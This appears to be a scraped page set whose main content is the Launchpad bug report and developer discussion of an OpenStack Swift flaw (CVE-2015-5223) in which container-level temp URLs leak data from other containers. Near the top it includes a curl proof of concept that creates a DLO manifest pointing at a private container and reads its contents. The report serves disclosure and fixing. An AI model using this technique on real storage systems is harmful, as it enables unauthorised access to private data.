  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from answers.launchpad.net_a1429db3_20250126_062833.html ===

[Log in / Register](https://answers.launchpad.net/swift/%2Blogin)

[![](https://launchpadlibrarian.net/52141984/os64.png)](https://launchpad.net/swift)

## [OpenStack Object Storage (swift)](https://launchpad.net/swift)

* [Overview](https://launchpad.net/swift)
* [Code](https://code.launchpad.net/swift)
* [Bugs](https://bugs.launchpad.net/swift)
* [Blueprints](https://blueprints.launchpad.net/swift)
* [Translations](https://translations.launchpad.net/swift)
* Answers

# Questions for OpenStack Object Storage (swift)

**Launchpad does not know where
OpenStack Object Storage (swift)
tracks support requests.**

OpenStack Object Storage (swift) questions are
tracked in:
[swift in Ubuntu](/ubuntu/%2Bsource/swift).

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from review.openstack.org_9768804f_20250126_062902.html ===




=== Content from launchpad.net_f0cbc688_20250126_062900.html ===

[Log in / Register](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Blogin)

[![](https://launchpadlibrarian.net/52141984/os64.png)](https://launchpad.net/swift)

## [OpenStack Object Storage (swift)](https://launchpad.net/swift)

* [Overview](https://launchpad.net/swift)
* [Code](https://code.launchpad.net/swift)
* [Bugs](https://bugs.launchpad.net/swift)
* [Blueprints](https://blueprints.launchpad.net/swift)
* [Translations](https://translations.launchpad.net/swift)
* [Answers](https://answers.launchpad.net/swift)

# Container level temp URLs can unintentionally leak data.

Bug #1449212 reported by
[Richard Hawkins](https://launchpad.net/~richard-hawkins)
on 2015-04-27

[262](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [OpenStack Object Storage (swift)](https://bugs.launchpad.net/swift) | Fix Released | Critical | Unassigned | [OpenStack Object Storage (swift) 2.4.0](https://launchpad.net/swift/%2Bmilestone/2.4.0) |
| Declined for Juno by [John Dickinson](https://launchpad.net/~notmyname) | | | | | |
|  | [Kilo](https://bugs.launchpad.net/swift/kilo) | Fix Committed | Undecided | Unassigned |  |
|  | [OpenStack Security Advisory](https://bugs.launchpad.net/ossa) | Fix Released | Medium | [Tristan Cacqueray](https://launchpad.net/~tristan-cacqueray) |  |

### Bug Description

A user, using a container level temp URL key, can create a PUT temp URL and create a DLO/SLO that references objects in another container, potentially leaking information that was intended to be private.

Example:

# Create object in container with secrets

$ curl -i -XPUT -H'x-auth-token: AUTH\_tkbfc02e65fe184fa88500de6e9293dced' <http://127.0.0.1:8080/v1/AUTH_test/secrets/foo.txt> --data "12345"

HTTP/1.1 201 Created

Last-Modified: Mon, 27 Apr 2015 18:34:45 GMT

Content-Length: 0

Etag: 827ccb0eea8a706c4c34a16891f84e7b

Content-Type: text/html; charset=UTF-8

X-Trans-Id: txdb50279b32684c198a1e5-00553e8144

Date: Mon, 27 Apr 2015 18:34:44 GMT

# Create PUT temp URL, and create DLO pointing to "secret" container.

$ curl -i -XPUT <http://127.0.0.1:8080/v1/AUTH_test/container_a/uhoh.txt>\?temp\_url\_sig\=b3b1a841a9262bbaa6eb546e5c2054be17377be5\;temp\_url\_expires\=1430160082 -H'X-Object-Manifest: secrets/f' -H'Content-Length: 0'

HTTP/1.1 201 Created

Last-Modified: Mon, 27 Apr 2015 18:37:08 GMT

Content-Length: 0

Etag: d41d8cd98f00b204e9800998ecf8427e

Content-Type: text/html; charset=UTF-8

X-Trans-Id: txf89037608c7a461f9f6f1-00553e81d3

Date: Mon, 27 Apr 2015 18:37:07 GMT

# GET secrets using temp URL

$ curl -i <http://127.0.0.1:8080/v1/AUTH_test/container_a/uhoh.txt>\?temp\_url\_sig\=25d3740e42b56cbbaae15094bfc2a4f3ce3def86\;temp\_url\_expires\=1430160141

HTTP/1.1 200 OK

Content-Length: 5

Accept-Ranges: bytes

X-Object-Manifest: container\_b/f

Last-Modified: Mon, 27 Apr 2015 18:37:08 GMT

Etag: "1f32aa4c9a1d2ea010adcf2348166a04"

X-Timestamp: 1430159827.15679

Content-Type: text/plain

Content-Disposition: attachment; filename="uhoh.txt"; filename\*=UTF-8''uhoh.txt

X-Trans-Id: txbfe86e01cdef48caaeac2-00553e81ea

Date: Mon, 27 Apr 2015 18:37:30 GMT

12345%

Tags:

[in-feature-crypto](/swift/%2Bbugs?field.tag=in-feature-crypto)
[in-feature-hummingbird](/swift/%2Bbugs?field.tag=in-feature-hummingbird)
[tempurl](/swift/%2Bbugs?field.tag=tempurl)

## CVE References

* [2015-5223](/bugs/cve/2015-5223 "OpenStack Object Storage (Swift) befo...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-04-27: |  |  | [#1](/swift/%2Bbug/1449212/comments/1) |
| --- | --- | --- | --- |

Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.

Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.

| **description**: | updated |
| --- | --- |
| Changed in ossa: | |
| **status**: | New → Incomplete |
| **description**: | updated |

[Christian Schwede (cschwede)](https://launchpad.net/~cschwede)
on 2015-04-27

| Changed in swift: | |
| --- | --- |
| **status**: | New → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-04-27: |  |  | [#2](/swift/%2Bbug/1449212/comments/2) |
| --- | --- | --- | --- |

Tested, and I can confirm this bug.

A possible bugfix might be something like this:

- set an internal flag if tempurl middleware validates a request using a container key

- check this flag in the slo/dlo middleware, and if set ensure access is only granted to segments within the same container like the original request

Any other ideas? Does that make sense? I can attach a patch tomorrow if this makes sense to anyone.

Tested, and I can confirm this bug.
A possible bugfix might be something like this:
- set an internal flag if tempurl middleware validates a request using a container key
- check this flag in the slo/dlo middleware, and if set ensure access is only granted to segments within the same container like the original request
Any other ideas? Does that make sense? I can attach a patch tomorrow if this makes sense to anyone.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-04-27: |  |  | [#3](/swift/%2Bbug/1449212/comments/3) |
| --- | --- | --- | --- |

You could probably get a similar effect by having tempurl set a swift.authorize callback that limits you to the appropriate scope (account or container), depending on where the key came from.

You could probably get a similar effect by having tempurl set a swift.authorize callback that limits you to the appropriate scope (account or container), depending on where the key came from.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-04-27: |  |  | [#4](/swift/%2Bbug/1449212/comments/4) |
| --- | --- | --- | --- |

what are the privileges required to set a container tempurl key? If you have to be a swift\_owner to set or read a container tempurl key then you already have privileges that you could theoretically elevate to - and this maybe more of a documentation issue. IIRC, account level tempurl keys allow you to grant temporary access to a manifest object regardless of the location of it's segment - so I think there's a strong analogy - and even if you hand out a PUT tempurl, and let someone create a cross-container manifest they'd still need to generate a GET tempurl to read cross container.

If we expect that container tempurl \*keys\* to be handed out to people that have a more restricted access than that - well that's probably different - object versioning would be the next most likely attack vector.

OTOH, perhaps regardless of the privilege level of the \*expected\* recipient of the key if the user story is that the attack surface of a tempurl key is reduced by restricting it to the container vs the account we may have to pursue a solution to limit the "pre-authorization" of requests to paths under the pre-authorized container. Perhaps leave a authorization callback in the environment and have it return 401 if the container in the path isn't the container who matched originally matched the tempurl key?

It seems like we need to understand the user expectation first. It may be surprising if you can \*make\* a tempurl for a segmented object - but can't acctually \*use\* it because the segments were in a different container? If we give out a tempurl for a PUT to overwrite an object in a versioned container - do we expect using the tempurl to PUT new data to be able to backup the existing object before the overwrite?

what are the privileges required to set a container tempurl key? If you have to be a swift\_owner to set or read a container tempurl key then you already have privileges that you could theoretically elevate to - and this maybe more of a documentation issue. IIRC, account level tempurl keys allow you to grant temporary access to a manifest object regardless of the location of it's segment - so I think there's a strong analogy - and even if you hand out a PUT tempurl, and let someone create a cross-container manifest they'd still need to generate a GET tempurl to read cross container.
If we expect that container tempurl \*keys\* to be handed out to people that have a more restricted access than that - well that's probably different - object versioning would be the next most likely attack vector.
OTOH, perhaps regardless of the privilege level of the \*expected\* recipient of the key if the user story is that the attack surface of a tempurl key is reduced by restricting it to the container vs the account we may have to pursue a solution to limit the "pre-authorization" of requests to paths under the pre-authorized container. Perhaps leave a authorization callback in the environment and have it return 401 if the container in the path isn't the container who matched originally matched the tempurl key?
It seems like we need to understand the user expectation first. It may be surprising if you can \*make\* a tempurl for a segmented object - but can't acctually \*use\* it because the segments were in a different container? If we give out a tempurl for a PUT to overwrite an object in a versioned container - do we expect using the tempurl to PUT new data to be able to backup the existing object before the overwrite?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-04-27: |  |  | [#5](/swift/%2Bbug/1449212/comments/5) |
| --- | --- | --- | --- |

> what are the privileges required to set a container tempurl key?

As far as I know, you have to be swift\_owner or a sub user with admin privileges to set/read the container level keys.

> If we expect that container tempurl \*keys\* to be handed out to people that have a more restricted access than that - well that's probably different - object versioning would be the next most likely attack vector.

I personally think container level temp URLs are similar to a ACL on a container. If I were a user, I would assume that if I created a key for a container level temp URL, and gave it out to a user, that they would only have access to read/write to that container. Just as if I had added them to an ACL for a container.

> do we expect using the tempurl to PUT new data to be able to backup the existing object before the overwrite?

Good question. =)

I need to check if a container level temp URL will allow you to set headers on a container. I don't think it does. If that is the case, it might be ok to allow writes to the object versioned container as it would take an account owner or admin to set that header, and a user with that key would not be able to change it. So it might make sense for a account owner to set the object version header for a container they are going to issue a container level key for.

I think I would prefer removing it from the release if possible as I would not want to rush to a solution that we might regret later. But if that is not an option, then I think having container level temp URLs that make requests to other containers 4xx, that would be ok too. At least 4xx would address security concerns, and how to improve it for cross container large objects/object versioning could be addressed at a later time, possibly extending temp URL to allow it.

> what are the privileges required to set a container tempurl key?
As far as I know, you have to be swift\_owner or a sub user with admin privileges to set/read the container level keys.
> If we expect that container tempurl \*keys\* to be handed out to people that have a more restricted access than that - well that's probably different - object versioning would be the next most likely attack vector.
I personally think container level temp URLs are similar to a ACL on a container. If I were a user, I would assume that if I created a key for a container level temp URL, and gave it out to a user, that they would only have access to read/write to that container. Just as if I had added them to an ACL for a container.
> do we expect using the tempurl to PUT new data to be able to backup the existing object before the overwrite?
Good question. =)
I need to check if a container level temp URL will allow you to set headers on a container. I don't think it does. If that is the case, it might be ok to allow writes to the object versioned container as it would take an account owner or admin to set that header, and a user with that key would not be able to change it. So it might make sense for a account owner to set the object version header for a container they are going to issue a container level key for.
I think I would prefer removing it from the release if possible as I would not want to rush to a solution that we might regret later. But if that is not an option, then I think having container level temp URLs that make requests to other containers 4xx, that would be ok too. At least 4xx would address security concerns, and how to improve it for cross container large objects/object versioning could be addressed at a later time, possibly extending temp URL to allow it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-04-28: |  |  | [#6](/swift/%2Bbug/1449212/comments/6) |
| --- | --- | --- | --- |

container tempurls don't let you set the headers on a container.

DLOs stored in a world-readable container don't work unless the target container also is readable (ie with .listings). Therefore you cannot use a public container to probe other containers.

Carrying that principle through, does that mean this issue needs to be resolved such that if a tempurl for reading a manifest references a different...what? container? A tempurl is for a specific object, so it's not like we can know if the intent is to prevent reading even objects in the same container. The reported issue isn't any different than current behavior with account-level tempurls: a GET tempurl is able to read the full contents of the referenced objects, in the case of \*LOs.

It seems reasonable to me that a tempurl to an object, even a \*LO, is able to return the full data for that object. The difference from the above example with public objects is that tempurls are temporary, limited tokens. Maybe that's not a reasonable assumption and we need to strictly limit all tempurl requests to \*only\* the specific object referenced. That would effectively kill tempurl+\*LO support, though.

The danger seems to be with the ability for a tempurl that allows PUT to probe the rest of the account for data. (PUTs allow HEADs, even if GETs aren't allowed). So maybe on solution is to simply prevent creating manifests via a tempurl, or at least via container tempurls.

Options:

1. Drop container tempurl feature in Kilo

2. Update docs to caution about tempurls that could be used to probe an account

3. Prevent container tempurls from creating \*LO objects (ie prevent them from leaving their container)

4. Prevent container tempurls from following \*LO objects on read

What do you think? Is it possible to find a solution and implement it in the next 18-24 hours for Kilo? Since it affects account tempurls too[1], maybe this is something that gets patched immediately after kilo (ie not a new issue, even though container-level tempurls are new).

[1] depending on your assumptions about the scope of account-level vs container-level tempurls

container tempurls don't let you set the headers on a container.
DLOs stored in a world-readable container don't work unless the target container also is readable (ie with .listings). Therefore you cannot use a public container to probe other containers.
Carrying that principle through, does that mean this issue needs to be resolved such that if a tempurl for reading a manifest references a different...what? container? A tempurl is for a specific object, so it's not like we can know if the intent is to prevent reading even objects in the same container. The reported issue isn't any different than current behavior with account-level tempurls: a GET tempurl is able to read the full contents of the referenced objects, in the case of \*LOs.
It seems reasonable to me that a tempurl to an object, even a \*LO, is able to return the full data for that object. The difference from the above example with public objects is that tempurls are temporary, limited tokens. Maybe that's not a reasonable assumption and we need to strictly limit all tempurl requests to \*only\* the specific object referenced. That would effectively kill tempurl+\*LO support, though.
The danger seems to be with the ability for a tempurl that allows PUT to probe the rest of the account for data. (PUTs allow HEADs, even if GETs aren't allowed). So maybe on solution is to simply prevent creating manifests via a tempurl, or at least via container tempurls.
Options:
1. Drop container tempurl feature in Kilo
2. Update docs to caution about tempurls that could be used to probe an account
3. Prevent container tempurls from creating \*LO objects (ie prevent them from leaving their container)
4. Prevent container tempurls from following \*LO objects on read
What do you think? Is it possible to find a solution and implement it in the next 18-24 hours for Kilo? Since it affects account tempurls too[1], maybe this is something that gets patched immediately after kilo (ie not a new issue, even though container-level tempurls are new).
[1] depending on your assumptions about the scope of account-level vs container-level tempurls

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-04-28: |  |  | [#7](/swift/%2Bbug/1449212/comments/7) |
| --- | --- | --- | --- |

The following works for me:

- an account owner "test:tester" creates a container "secret" with some data in it

- the account owner creates another container "other" and sets a container temp url key on it and a r/w ACL for user test:tester3

Now user test:tester3 can create a DLO in container "other" and uses a tempurl to access the data in container "secret". Of course the object names need to be known in advance to access them.

I think this is not wanted. To me the best option seems to be to check if the used \*container\* temp url key is in the same container like the \*SLO. This wouldn't change existing behavior for account container keys.

The following works for me:
- an account owner "test:tester" creates a container "secret" with some data in it
- the account owner creates another container "other" and sets a container temp url key on it and a r/w ACL for user test:tester3
Now user test:tester3 can create a DLO in container "other" and uses a tempurl to access the data in container "secret". Of course the object names need to be known in advance to access them.
I think this is not wanted. To me the best option seems to be to check if the used \*container\* temp url key is in the same container like the \*SLO. This wouldn't change existing behavior for account container keys.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-04-28: |  |  | [#8](/swift/%2Bbug/1449212/comments/8) |
| --- | --- | --- | --- |

* [tempurl\_fix.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4386391/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4386391)
  (5.6 KiB,
  text/plain)

I attached a possible patch for DLO requests including updated unittests.

Let me know if this approach looks feasible, I would continue with SLO then.

We should also check if versioned objects as well as COPY requests are affected too.

I attached a possible patch for DLO requests including updated unittests.
Let me know if this approach looks feasible, I would continue with SLO then.
We should also check if versioned objects as well as COPY requests are affected too.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-04-28: |  |  | [#9](/swift/%2Bbug/1449212/comments/9) |
| --- | --- | --- | --- |

* [tempurl\_fix.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4386423/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4386423)
  (8.3 KiB,
  text/plain)

Updated patch, with some refactoring applied.

Updated patch, with some refactoring applied.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-04-28: |  |  | [#10](/swift/%2Bbug/1449212/comments/10) |
| --- | --- | --- | --- |

Note: you can't (currently) do this with SLOs since tempurl helpfully (yuck) strips off any query params other than temp\_url\_sig and temp\_url\_expires.

Note: you can't (currently) do this with SLOs since tempurl helpfully (yuck) strips off any query params other than temp\_url\_sig and temp\_url\_expires.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [David Goetz (david-goetz)](https://launchpad.net/~david-goetz) wrote on 2015-04-28: |  |  | [#11](/swift/%2Bbug/1449212/comments/11) |
| --- | --- | --- | --- |

I think the idea of restricting temp url requests from only hitting that single container is workable but is not a great solution. I think forcing every middleware that does sub requests to do:

if allowed\_container and container != allowed\_container:

+ return HTTPUnauthorized(request=req)

is asking for problems imo. We have to add this to DLOs, SLOs, versioning, etc. My problem with the container lvl tempurls is that it provides anonymous access to objects. This doesn't jive all that well with container ACLs that are completely based on who is making the call. I'd want a pretty good reason to change this model and I don't know if container level tempurls (while a neat idea) is worth it. I'd much rather pull it from the release and figure out a better way than forcing something in quickly and regretting it later.

I think the idea of restricting temp url requests from only hitting that single container is workable but is not a great solution. I think forcing every middleware that does sub requests to do:
if allowed\_container and container != allowed\_container:
+ return HTTPUnauthorized(request=req)
is asking for problems imo. We have to add this to DLOs, SLOs, versioning, etc. My problem with the container lvl tempurls is that it provides anonymous access to objects. This doesn't jive all that well with container ACLs that are completely based on who is making the call. I'd want a pretty good reason to change this model and I don't know if container level tempurls (while a neat idea) is worth it. I'd much rather pull it from the release and figure out a better way than forcing something in quickly and regretting it later.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-04-28: |  |  | [#12](/swift/%2Bbug/1449212/comments/12) |
| --- | --- | --- | --- |

I'm so far failing to see how the vulnerability is limited to container level tempurl. Seems like if I have a tempurl to PUT to /a/c/o then I can PUT a manifest that points to a target /a/c\_other/o\_other and then HEAD the target. From staring at code it seems to me that works regardless of who generated the tempurl and using which keys.

\*If\* that is case I then reverting the container level tempurl feature would only serve to reveal the vulnerability with account level tempurl, and not really fix anything. So I'd advocate no revert and working on a fix to the problem across account and container level.

If I'm wrong and this vulnerability only exists with container level urls then I'm inclined to agree that rushing into a quick fix for kilo might be a mistake vs reverting the change.

I'm so far failing to see how the vulnerability is limited to container level tempurl. Seems like if I have a tempurl to PUT to /a/c/o then I can PUT a manifest that points to a target /a/c\_other/o\_other and then HEAD the target. From staring at code it seems to me that works regardless of who generated the tempurl and using which keys.
\*If\* that is case I then reverting the container level tempurl feature would only serve to reveal the vulnerability with account level tempurl, and not really fix anything. So I'd advocate no revert and working on a fix to the problem across account and container level.
If I'm wrong and this vulnerability only exists with container level urls then I'm inclined to agree that rushing into a quick fix for kilo might be a mistake vs reverting the change.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-04-28: |  |  | [#13](/swift/%2Bbug/1449212/comments/13) |
| --- | --- | --- | --- |

I think it is limited to container level as, if you have an account temp URL key, and you have a DLO/SLO, you could just generate a temp URL for each segment of the DLO/SLO and get the data that way.

With a container level temp URL, your container key would be no good to generate a temp URL for an object in a different container, unless that key was also set on that other container.

I think it is limited to container level as, if you have an account temp URL key, and you have a DLO/SLO, you could just generate a temp URL for each segment of the DLO/SLO and get the data that way.
With a container level temp URL, your container key would be no good to generate a temp URL for an object in a different container, unless that key was also set on that other container.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-04-28: |  |  | [#14](/swift/%2Bbug/1449212/comments/14) |
| --- | --- | --- | --- |

I think reverting the feature until we figure this out is a good way to go. If we have to cut a release tomorrow, I'd rather not wedge something in there, and I don't think we'll figure this out in time.

I think reverting the feature until we figure this out is a good way to go. If we have to cut a release tomorrow, I'd rather not wedge something in there, and I don't think we'll figure this out in time.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-04-28: |  |  | [#15](/swift/%2Bbug/1449212/comments/15) |
| --- | --- | --- | --- |

What about if we just make PUT tempurls not work for creating a \*LO manifest? Might break some people - but I don't really know for what use-case? We could even make it a "enable thing that's probably a bad idea" option with default of False?

What about if we just make PUT tempurls not work for creating a \*LO manifest? Might break some people - but I don't really know for what use-case? We could even make it a "enable thing that's probably a bad idea" option with default of False?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [paul luse (paul-e-luse)](https://launchpad.net/~paul-e-luse) wrote on 2015-04-28: |  |  | [#16](/swift/%2Bbug/1449212/comments/16) |
| --- | --- | --- | --- |

Reading through all of this, and not having gone through all of the relevant code yet, my 2 cents is worth, well whatever, but it seems like we ought to revert and, as Sam states, work on a more well thought out solution for a near term follow on release. Releasing Kilo with a quick-attempt-fix for a security issue doesn't feel right.

Reading through all of this, and not having gone through all of the relevant code yet, my 2 cents is worth, well whatever, but it seems like we ought to revert and, as Sam states, work on a more well thought out solution for a near term follow on release. Releasing Kilo with a quick-attempt-fix for a security issue doesn't feel right.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-04-28: |  |  | [#17](/swift/%2Bbug/1449212/comments/17) |
| --- | --- | --- | --- |

For what it's worth, if this is new in Kilo and the decision is to leave it in the release, then we may need to continue working out the fix in private and issue a security advisory once it's done. On the other hand if it's reverted now and punted to Liberty development then there's no need for further embargo or any advisory.

For what it's worth, if this is new in Kilo and the decision is to leave it in the release, then we may need to continue working out the fix in private and issue a security advisory once it's done. On the other hand if it's reverted now and punted to Liberty development then there's no need for further embargo or any advisory.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-04-28: |  |  | [#18](/swift/%2Bbug/1449212/comments/18) |
| --- | --- | --- | --- |

After further discussion (in IRC), this will be treated as any security issue and there will not be a revert or patch for kilo (swift 2.3.0) before the release.

This issue has a few interesting points:

1) tempurls which allow PUT also allow HEAD.

2) tempurls follow manifests to return the entire object, regardless of where the segments are or permissions on their container

3) because of 1 and 2, a user with a tempurl can create a DLO and then probe the rest of the account for other objects. This is true no matter the key used to generate the tempurl

4) container keys are meant to be shared with subusers so that the subuser can pass out container-scoped tempurls. The subuser would have an indentity (ie token) to access the container.

5) Because of 1, 2, and 4 subusers can probe for objects in the account. ie the tempurl crosses the container boundary.

The solution has a few points:

1) Prevent tempurl PUTs from writing DLOs (by returning an error if x-object-manifest header is on the request).

2) The tempurl should tract the scope of the signed url (ie account and container) so that it cannot cross boundaries. In other words, the subrequests generated eg to fetch DLO segments should be authorized according to the original tempurl (not with a blanket "allow" authorize() callback).

After further discussion (in IRC), this will be treated as any security issue and there will not be a revert or patch for kilo (swift 2.3.0) before the release.
This issue has a few interesting points:
1) tempurls which allow PUT also allow HEAD.
2) tempurls follow manifests to return the entire object, regardless of where the segments are or permissions on their container
3) because of 1 and 2, a user with a tempurl can create a DLO and then probe the rest of the account for other objects. This is true no matter the key used to generate the tempurl
4) container keys are meant to be shared with subusers so that the subuser can pass out container-scoped tempurls. The subuser would have an indentity (ie token) to access the container.
5) Because of 1, 2, and 4 subusers can probe for objects in the account. ie the tempurl crosses the container boundary.
The solution has a few points:
